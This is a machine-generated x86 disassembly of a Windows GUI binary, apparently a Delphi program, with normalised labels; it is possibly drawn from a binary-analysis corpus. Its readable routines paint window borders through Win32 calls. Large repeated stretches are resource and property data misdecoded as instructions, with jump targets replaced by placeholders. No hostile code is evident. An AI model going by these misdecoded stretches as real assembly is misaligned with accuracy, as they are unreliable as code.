mov [ ecx + 0x4 ] 0x1f
mov eax 0x62
jmp r-xdata
mov [ ecx + 0x4 ] 0x20
mov eax 0x63
jmp r-xdata
mov [ ecx + 0x4 ] 0x21
mov eax 0x64
jmp r-xdata
mov [ ecx + 0x4 ] 0x22
mov eax 0x65
jmp r-xdata
mov [ ecx + 0x4 ] 0x23
mov eax 0x66
jmp r-xdata
mov [ ecx + 0x4 ] 0x24
mov eax 0x67
jmp r-xdata
mov [ ecx + 0x4 ] 0x25
mov eax 0x68
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_42fd74
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_443708
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443708
push eax
call GetWindowRect
mov eax [ ebp - 0x24 ]
neg eax
push eax
mov eax [ ebp - 0x28 ]
neg eax
push eax
lea eax [ ebp - 0x28 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
call sub_443708
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_42fecf
push [ fs : edx ]
mov [ fs : edx ] esp
push esi
lea esi [ ebp - 0x28 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
test bl bl
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax 0x2
push eax
mov eax [ ebp - 0x20 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x24 ]
add eax 0x2
push eax
mov eax [ ebp - 0x28 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
lea ecx [ ebp - 0x34 ]
mov dl 0x2
mov eax esi
call sub_42f910
lea eax [ ebp - 0x28 ]
push eax
push 0x0
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_42f734
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443708
push eax
call ReleaseDC
retn
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_443708
push eax
call GetWindowLongA
test eax 0x100000
je r-xdata
test eax 0x200000
je r-xdata
push 0x2
call GetSystemMetrics
mov edi eax
push 0x3
call GetSystemMetrics
mov ebx eax
push 0xfffffffe
push 0xfffffffe
lea eax [ ebp - 0x18 ]
push eax
call InflateRect
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov edx [ ebp - 0xc ]
sub edx ebx
mov eax [ ebp - 0x10 ]
sub eax edi
mov ecx [ ebp - 0x10 ]
call sub_412b10
push esi
lea esi [ ebp - 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0xf
call GetSysColorBrush
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FillRect
sub_42fefc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42ff37
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ff3e
retn
mov eax [ rw-data ]
call sub_403258
mov eax rw-data
call sub_403fa8
sub_42ffa6
inc ebx
add ah bh
test [ ebx ] 0x8
int 0x43
add [ ecx - 0x6163ffbf ] dh
inc ecx
add [ esi + ebx * 4 - 0x5e43ffbf ] dl
inc ecx
add [ edx + esi ] bl
inc ebx
add [ edi + 0x42500044 ] dh
inc esp
add [ ecx + eax * 2 - 0x3d9bffbc ] bl
inc ebx
add [ eax - 0x2fffbbc9 ] dh
aaa
inc esp
add al ch
xor al 0x44
add [ ecx + eax * 8 - 0x3e4fffbd ] ch
inc ebx
add [ ecx + esi * 8 - 0xe27ffbd ] ch
inc ebx
add al dh
int3
sub_430240
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ ebx ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + eax ] bl
inc ebx
add [ eax - 0x7ffffff ] dl
add [ ebx ] al
pushfd
mov eax [ 0x34ac0041 ]
inc eax
add al dh
0x34b40041 0x40
xor al 0xe3
inc ebx
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ ecx + ecx * 2 - 0xfebffbc ] cl
inc ebx
add [ esp ] cl
inc ebx
add [ eax ] al
inc ebp
inc ecx
add [ edx + edi + 0x43 ] bh
add [ esp + edi + 0x43 ] ah
add [ ebx + eax * 8 + 0x43 ] bl
add [ eax ] cl
int 0x43
add [ ecx - 0x6163ffbf ] dh
inc ecx
add [ esi + ebx * 4 - 0x5e43ffbf ] dl
inc ecx
add [ edi + esi + 0x43 ] ah
add [ esi + ebx * 8 - 0x215fffbd ] ah
inc ebx
add [ eax - 0x21 ] dh
inc ebx
add [ edx + eax * 8 + 0x43 ] ah
add [ eax + 0xc0043c9 ] ch
leave
inc ebx
add [ edx + edx * 8 ] dh
inc ebx
add [ ecx + eax * 8 - 0x3e4fffbd ] ch
inc ebx
add [ ecx + esi * 8 - 0xe27ffbd ] ch
inc ebx
add [ ebx + edi - 0x3cd7ffbd ] al
inc ebx
add [ esi + ecx * 8 + 0x43 ] bh
add ah dh
int 0x43
add [ eax ] cl
rol [ ebx ] 0x1
mov ah 0xcf
inc ebx
add [ eax + 0x5c0043e1 ] ah
inc ebx
add ah dh
rol [ ebx ] cl
push 0xdc0043d4
les eax [ ebx ]
dec eax
aam 0x43
add [ eax - 0x3ffbcc7 ] al
aaa
inc ebx
add [ esi ] al
push esp
dec esp
popad
bound esp [ ebp + 0x6c ]
nop
sub [ ebx ] al
inc ebx
add [ edi ] al
push es
push esp
dec esp
popad
bound esp [ ebp + 0x6c ]
mov [ edx ] al
inc ebx
add [ edx + eax ] dl
inc ebx
add [ edx ] dh
add [ eax ] cl
push ebx
je r-xdata
add [ edi ] al
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
inc ebx
je r-xdata
add ah bl
rol [ ebx ] 0x1
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
add eax 0x6f6c6f43
jb r-xdata
add [ eax ] dl
inc eax
add [ ebp + 0x1 ] ch
add bh bh
pop esp
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
insb
jae r-xdata
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
jge r-xdata
inc ebx
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
inc esp
rol [ ebx ] 0x1
add [ eax ] al
add [ eax - 0x80000000 ] al
str [ eax ]
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x8865646f
jl r-xdata
add bh bh
push 0x100433b
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al 0x0
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
loopne r-xdata
add [ eax + 0x5b004375 ] bh
add [ eax ] al
push [ esp + eax * 8 ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jne r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0012 ] al
outsd
outsb
jae r-xdata
add [ eax + eax ] dh
push esp
inc ebx
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jb r-xdata
je r-xdata
add [ eax ] ah
iretd
add [ eax + 0x43070010 ] al
popad
jo r-xdata
inc ebx
add [ ecx ] ah
add bh bh
je r-xdata
[ ebx + edi + 0x10043 ]
jae r-xdata
add [ eax ] al
add [ 0x72440800 ] dl
popad
imul ebp [ esi + 0x74 ] 0x4375a073
add [ edx ] bh
add bh bh
jpe r-xdata
add bh bh
hlt
add bh bh
fwait
imul ebp [ edi + 0x6e ] sub_41b0a8
jo r-xdata
or eax [ eax ]
add eax 0x67696c41
outsb
add [ eax ] al
add [ eax ] al
inc ebx
add [ eax ] dl
retn
add bh bh
lodsb [ esi ]
cmp eax [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ esi + eax * 2 ] cl
outsd
arpl [ ebp + 0x73 ] si
inc ebx
outsd
outsb
je r-xdata
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc eax [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
add bh bh
rcl al 0x43
inc eax
add [ ecx ] bl
add bh bh
dec esp
rol [ ebx ] 0x1
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
sbb eax [ eax ]
or dl [ eax + 0x61 ]
jb r-xdata
outsd
insb
dec eax
mov ch 0x41
add [ eax ] ch
add bh bh
adc al 0xd0
inc ebx
add [ eax + edx * 8 ] ah
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040018 ] al
outsd
outsb
je r-xdata
dec ebp
outsd
add [ gs : eax ] dl
or [ edx + esi * 2 + 0x61 ] al
jl r-xdata
add [ eax + 0x1 ] al
outsb
je r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
inc eax
add [ eax ] dl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
add [ ebx - 0x64010000 ] bl
adc [ eax ] al
mov al [ 0xffffffffdc00433b ]
cmp eax [ ebx ]
mov [ ecx ] al
add bh bh
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] al
or edx [ edx + esi * 2 + 0x61 ]
outsb
jae r-xdata
or [ eax + 0x6f ] edx
jo r-xdata
outsd
outsb
je r-xdata
add [ eax ] eax
jmp [ eax ]
popad
jb r-xdata
je r-xdata
jo r-xdata
adc [ eax ] al
0x94ff0000 0x43d0
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
push cs
push eax
popad
jb r-xdata
jb r-xdata
outsb
inc eax
add [ ecx + 0x70ff0000 ] bl
rol [ ebx ] 0x1
cmp al dl
inc ebx
add [ ebx ] al
outsb
add [ eax ] eax
jmp [ eax ]
je r-xdata
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001f ] al
push 0x6948776f
outsb
outsb
je r-xdata
add [ eax ] al
and [ esi ] 0x0
or cl [ edi + 0x6e ]
jo r-xdata
adc [ eax ] al
jo r-xdata
add [ eax ] dl
push 0x6948776f
outsb
je r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
push es
dec esp
popad
jns r-xdata
adc eax 0x1200041
add bh bh
and [ ecx ] al
add bh bh
mov esp 0x43ef
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070024 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
inc eax
cmp eax [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
push ds
add bh bh
sar [ ebx ] 0x43
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ 0x776f6853 ] cl
inc ecx
arpl [ ebx + 0x65 ] sp
insb
inc ebx
push 0x10007261
add [ eax ] al
add [ esi ] bl
retn 0x44
add [ eax ] al
add [ eax + 0x4f09002d ] al
outsb
dec ebp
outsd
jne r-xdata
inc esp
jle r-xdata
jo r-xdata
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0e00
jne r-xdata
add [ eax ] al
js r-xdata
inc esp
outsd
arpl [ ebx - 0x70 ] bp
add [ ebx ] 0x10
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0031 ] al
outsb
push ebp
jo r-xdata
jae r-xdata
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc ebx
outsd
outsb
je r-xdata
outsb
jg r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0025 ] al
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
inc eax
into
inc ebx
add [ edi + ebp * 8 + 0x43 ] bl
add [ eax + 0x1 ] al
and al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
outsd
add [ eax ] eax
add [ eax + 0x4f0b002b ] al
add [ eax ] al
dec edi
jbe r-xdata
fadd [ eax + 0x1080043 ]
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ edi + 0x6e ] ecx
push eax
outsd
jo r-xdata
je r-xdata
jb r-xdata
dec ebp
outsd
jne r-xdata
adc eax 0x1800041
add bh bh
add [ ecx ] 0x0
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002e ] al
outsb
dec ebp
outsd
jne r-xdata
add [ eax + 0x4f0c002f ] al
dec ebp
je r-xdata
inc esp
outsd
ja r-xdata
outsd
arpl [ ebx - 0x28 ] bp
add [ ebx ] 0x18
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
jb r-xdata
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
jb r-xdata
inc ebp
outsb
inc esp
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
outsb
jo r-xdata
cmp al 0x10
add [ eax - 0x70 ] ah
jae r-xdata
inc esp
or [ ebx ] eax
or [ ecx ] dl
push esp
inc esp
jb r-xdata
inc ebp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
dec esp
outsb
dec ebp
outsd
jne r-xdata
or al 0x4f
inc esp
jle r-xdata
push ebx
je r-xdata
xor [ ecx ] 0x0
or ecx [ edi + 0x6e ]
jb r-xdata
mov esp 0xd800437e
add [ eax ] al
outsd
add [ ebx ] 0x8
push edi
outsd
jb r-xdata
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe942073d
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
outsb
inc esp
jb r-xdata
adc eax 0x1280041
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : edx ] cl
dec edi
outsb
int 0x43
add [ ecx - 0x6163ffbf ] dh
inc ecx
add [ esi + ebx * 4 - 0x5e43ffbf ] dl
inc ecx
add [ esi + edi + 0x43 ] ch
add [ edi + 0x42500044 ] dh
inc esp
add [ ecx + eax * 2 - 0x3d9bffbc ] bl
inc ebx
add [ eax - 0x2fffbbc9 ] dh
aaa
inc esp
add al ch
xor al 0x44
add [ ecx + eax * 8 - 0x3e4fffbd ] ch
inc ebx
add [ ecx + esi * 8 - 0xe27ffbd ] ch
inc ebx
add al dh
int3
je r-xdata
xor [ eax ] eax
add [ eax ] al
add al bl
mov [ ebx ] eax
mov al [ 0xffffffffac004034 ]
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
jb r-xdata
inc ebx
add [ eax + edx ] bh
inc eax
add [ eax ] al
add [ eax ] al
add ah ah
aam 0x8
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
jb r-xdata
adc [ edx + edx * 2 ] al
dec ecx
outsb
outsd
outsb
je r-xdata
cwde
add [ ebx ] 0x0
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
outsb
push ebx
je r-xdata
outsb
inc ebp
add al ah
add [ eax ] al
jmp eax
outsd
jne r-xdata
adc eax 0x1780041
add bh bh
js r-xdata
push edi
inc ebx
add [ eax ] cl
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xac4c08b
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
or eax [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
or eax [ ebx ]
scasb [ edi ]
or eax [ ebx ]
or al 0x2
add [ eax ] al
lodsb [ esi ]
mov [ ebx ] es
pushfd
mov eax [ 0x34ac0041 ]
inc eax
add al dh
0x34b40041 0x40
adc [ edx ] 0x44
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax - 0xb ] bl
inc ebx
add [ eax ] ah
inc edx
inc esp
add [ eax + 0xa ] cl
inc esp
add [ eax ] al
inc ebp
inc ecx
add ah bl
out dx eax
inc ebx
add al dh
retn
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ecx + 0x43 ] ah
add [ eax + eax ] ch
dec ecx
je r-xdata
pop edi
inc eax
add [ ebx + 0x430944c0 ] cl
ja r-xdata
jb r-xdata
je r-xdata
outsd
jb r-xdata
jb r-xdata
outsd
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
outsb
je r-xdata
je r-xdata
jb r-xdata
popad
jbe r-xdata
outsd
jbe r-xdata
dec ebp
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ edi + ecx * 2 ] cl
add [ eax ] al
fmul [ ecx + 0x34a00043 ]
inc eax
add [ esp + esi + 0x34b00040 ] ch
add [ eax ] al
add [ eax ] al
insd
inc ebp
jbe r-xdata
jb r-xdata
je r-xdata
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push es
je r-xdata
push 0x6e490774
andps xmm1 [ edi + 0x77 ]
outsb
jb r-xdata
add [ esi ] eax
dec ecx
outsb
je r-xdata
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + eax + 0x5 ] si
push ebx
je r-xdata
add al 0x52
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
mov al 0x34
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
jb r-xdata
outsd
insb
add [ 0x65646e49 ] al
js r-xdata
popad
add [ eax ] al
or al [ fs : ebx ]
sub al 0x0
outsb
je r-xdata
ja r-xdata
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x65 ] edx
popad
insd
inc ebp
jbe r-xdata
add [ esi + edi * 4 - 0x5d0fffbd ] al
inc ecx
add [ eax ] dh
mov edi 0xa2400043
inc ecx
add ah dl
mov [ 0xffffffffa3280041 ] al
inc ecx
add [ eax - 0x43 ] dh
inc ebx
add al dl
cmp eax 0xbde40043
inc ebx
add [ eax - 0x6e ] bh
inc esp
add [ esp + esi * 8 ] ah
inc ebx
add [ edi + edi * 4 + 0x43 ] bl
add [ eax ] bl
mov esi 0x92c80043
inc esp
add ah bl
xchg edx eax
inc esp
add [ eax - 0x42 ] dl
inc ebx
add [ ebx + edx * 4 ] al
inc esp
add [ esi + edi * 4 + 0x3e080043 ] ch
inc ebx
add ah cl
mov esi 0x93140043
inc esp
add [ esp + esi * 8 ] ch
inc ebx
add al al
mov edi 0xc0000043
inc ebx
add ah ch
mov esi 0x93280043
inc esp
add [ ebx + edx * 4 ] ch
inc esp
add [ eax ] dl
mov edi 0xbc800043
inc ebx
add [ ecx ] dl
push esp
inc edx
jne r-xdata
jb r-xdata
outsb
je r-xdata
inc eax
add [ eax - 0x53ffbe5e ] cl
cmp eax 0xa2bc0043
inc ecx
add [ edx + esi ] cl
jb r-xdata
inc eax
or al 0x32
[ eax ] eax
insb
add [ 0x65646e49 ] al
js r-xdata
add ecx [ eax ]
pop es
inc ebx
outsd
outsb
je r-xdata
je r-xdata
dec ebp
popad
outsb
je r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ ebx + 0x4309e8c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
nop
inc ebx
add [ eax + edx ] bh
outsd
jb r-xdata
add al 0x8
pop es
inc ebx
sub_43036f
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al 0x0
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
loopne r-xdata
add [ eax + 0x43070010 ] al
popad
jo r-xdata
inc ebx
add [ ecx ] ah
add bh bh
je r-xdata
add bh bh
fwait
imul ebp [ edi + 0x6e ] sub_41b0a8
jo r-xdata
add [ eax ] al
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
inc ebx
add [ eax ] dl
retn
add bh bh
rcl al 0x43
add ah bl
rol [ ebx ] 0x1
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
add eax 0x6f6c6f43
jb r-xdata
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
jge r-xdata
inc ebx
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
inc esp
rol [ ebx ] 0x1
add [ eax ] al
add [ eax - 0x80000000 ] al
str [ eax ]
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x8865646f
jl r-xdata
jne r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0012 ] al
outsd
outsb
jae r-xdata
add [ eax + eax ] dh
push esp
inc ebx
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jb r-xdata
je r-xdata
add [ eax ] ah
iretd
[ ebx + edi + 0x10043 ]
jae r-xdata
add [ eax ] al
add [ 0x72440800 ] dl
popad
imul ebp [ esi + 0x74 ] 0x4375a073
add [ edx ] bh
add bh bh
jpe r-xdata
add bh bh
hlt
add bh bh
lodsb [ esi ]
cmp eax [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ esi + eax * 2 ] cl
outsd
arpl [ ebp + 0x73 ] si
inc ebx
outsd
outsb
je r-xdata
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc eax [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
inc eax
add [ ecx ] bl
add bh bh
dec esp
rol [ ebx ] 0x1
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
sbb eax [ eax ]
or dl [ eax + 0x61 ]
jb r-xdata
outsd
insb
dec eax
mov ch 0x41
add [ eax ] ch
add bh bh
adc al 0xd0
inc ebx
add [ eax + edx * 8 ] ah
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040018 ] al
outsd
outsb
je r-xdata
dec ebp
outsd
add [ gs : eax ] dl
or [ edx + esi * 2 + 0x61 ] al
jl r-xdata
add [ eax + 0x1 ] al
outsb
je r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
inc eax
add [ eax ] dl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
add [ ebx - 0x64010000 ] bl
adc [ eax ] al
mov al [ 0xffffffffdc00433b ]
cmp eax [ ebx ]
mov [ ecx ] al
add bh bh
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] al
or edx [ edx + esi * 2 + 0x61 ]
outsb
jae r-xdata
or [ eax + 0x6f ] edx
jo r-xdata
outsd
outsb
je r-xdata
add [ eax ] eax
jmp [ eax ]
popad
jb r-xdata
je r-xdata
jo r-xdata
adc [ eax ] al
0x94ff0000 0x43d0
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
push cs
push eax
popad
jb r-xdata
jb r-xdata
outsb
inc eax
add [ ecx + 0x70ff0000 ] bl
rol [ ebx ] 0x1
cmp al dl
inc ebx
add [ ebx ] al
outsb
add [ eax ] eax
jmp [ eax ]
je r-xdata
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001f ] al
push 0x6948776f
outsb
outsb
je r-xdata
add [ eax ] al
and [ esi ] 0x0
or cl [ edi + 0x6e ]
jo r-xdata
adc [ eax ] al
jo r-xdata
add [ eax ] dl
push 0x6948776f
outsb
je r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
push es
dec esp
popad
jns r-xdata
adc eax 0x1200041
add bh bh
and [ ecx ] al
add bh bh
mov esp 0x43ef
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070024 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
inc eax
cmp eax [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
push ds
add bh bh
sar [ ebx ] 0x43
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ 0x776f6853 ] cl
inc ecx
arpl [ ebx + 0x65 ] sp
insb
inc ebx
push 0x10007261
add [ eax ] al
add [ esi ] bl
retn 0x44
add [ eax ] al
add [ eax + 0x4f09002d ] al
outsb
dec ebp
outsd
jne r-xdata
inc esp
jle r-xdata
jo r-xdata
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0e00
jne r-xdata
add [ eax ] al
js r-xdata
inc esp
outsd
arpl [ ebx - 0x70 ] bp
add [ ebx ] 0x10
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0031 ] al
outsb
push ebp
jo r-xdata
jae r-xdata
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc ebx
outsd
outsb
je r-xdata
outsb
jg r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0025 ] al
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
inc eax
into
inc ebx
add [ edi + ebp * 8 + 0x43 ] bl
add [ eax + 0x1 ] al
and al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
outsd
add [ eax ] eax
add [ eax + 0x4f0b002b ] al
add [ eax ] al
dec edi
jbe r-xdata
fadd [ eax + 0x1080043 ]
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ edi + 0x6e ] ecx
push eax
outsd
jo r-xdata
je r-xdata
jb r-xdata
dec ebp
outsd
jne r-xdata
adc eax 0x1800041
add bh bh
add [ ecx ] 0x0
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002e ] al
outsb
dec ebp
outsd
jne r-xdata
add [ eax + 0x4f0c002f ] al
dec ebp
je r-xdata
inc esp
outsd
ja r-xdata
outsd
arpl [ ebx - 0x28 ] bp
add [ ebx ] 0x18
add [ eax ] eax
